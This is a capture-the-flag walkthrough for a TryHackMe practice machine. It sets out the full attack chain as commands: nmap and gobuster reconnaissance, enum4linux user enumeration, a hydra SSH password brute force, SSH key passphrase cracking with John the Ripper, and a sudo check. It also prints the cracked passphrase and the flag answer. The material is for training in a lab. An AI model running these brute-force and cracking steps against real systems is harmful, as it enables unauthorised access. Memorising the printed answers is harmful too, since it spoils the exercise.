# [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

> This is a machine that allows you to practise web app hacking and privilege escalation

## Scanning

scan the machine

```
nmap -A -T4 10.10.3.159
```

![image](https://user-images.githubusercontent.com/90561566/201595571-66955a77-92c2-4595-8b18-7bc2fb6a639b.png)

There are 6 open and 6 filterd ports (total 12) to discover

## HTTP

go to the webpage

![image](https://user-images.githubusercontent.com/90561566/201596415-920d1fe7-db23-45b1-9e5b-cfcdd09538f4.png)

nothing here

## Enumeration

scan directories with gobuster

```
gobuster dir -u http://10.10.3.159/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://user-images.githubusercontent.com/90561566/201596771-7e2d4256-9eaa-48ac-add1-3bfcdc486e68.png)

we find an endpoint at /development

![image](https://user-images.githubusercontent.com/90561566/201596974-894f4168-30ad-44b6-8d77-d9ef6ccbbffc.png)

j.txt

![image](https://user-images.githubusercontent.com/90561566/201597065-11314392-492f-444f-aa6d-8551acf64d46.png)

dev.txt

![image](https://user-images.githubusercontent.com/90561566/201597215-b8a10c73-6708-487a-b95e-4bc690a7008e.png)

hmm, we will use enum4linux to enumerate users 

```
enum4linux -a 10.10.3.159
```

![image](https://user-images.githubusercontent.com/90561566/201598898-fb5ba835-85af-45d9-92e4-bc10a91601ef.png)

we can see 2 users are `kay` and `jan` aka K & J in the previous task

## Exploitation

now we use hydra to brute force the password

we have the information about the open ports and SSH is a great candidate

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.3.159
```

wait about 8 mins, there is your password

![image](https://user-images.githubusercontent.com/90561566/201611043-e714f25a-370c-4d0b-966f-51303e662e56.png)

now we can ssh into the server

```
ssh jan@10.10.154.165
```

![image](https://user-images.githubusercontent.com/90561566/201611517-7825cde1-9a90-46a2-b343-2ee76f29dc19.png)

## Privilege Escalation

let's find something around, i see a lot of awesome files in kay folder

![image](https://user-images.githubusercontent.com/90561566/201612657-60cac56f-ed34-4226-b8ce-cbac5069f5e5.png)

we cannot read pass.bak at the moment

but we can crack ssh key

![image](https://user-images.githubusercontent.com/90561566/201613947-e61ae35c-48d6-4ef2-af09-7ccc4128a04d.png)

unfortulately, it requires a passphrase

but we can cat out this file and crack the key with JohnTheRipper by [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)

first clone id_rsa to our machine and 

```
python3 ssh2john.py id_rsa > id_rsa.txt
```

crack the passphrase

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
```

![image](https://user-images.githubusercontent.com/90561566/201619172-4071e65c-9f6d-4909-84fa-026919c3a6ab.png)

passphrase is `beeswax`

now ssh to kay account

```
ssh -i id_rsa kay@localhost
```

![image](https://user-images.githubusercontent.com/90561566/201619950-1ab5730f-dc67-474b-9627-08361afd23e3.png)

```
cat pass.bak
```

| Flag | pass.bak |
| --- | --- |
| Answer | heresareallystrongpasswordthatfollowsthepasswordpolicy$$ |

## Bonus

if you still want to root, check out

```
sudo -l -l
```

![image](https://user-images.githubusercontent.com/90561566/201621033-46f14051-62cd-4016-a23c-febf577f24ad.png)

it say that we can run every command with sudoer

![image](https://user-images.githubusercontent.com/90561566/201621302-854f7c4c-a0f9-4b75-bf9a-d829e9fdb266.png)

Got it! End point
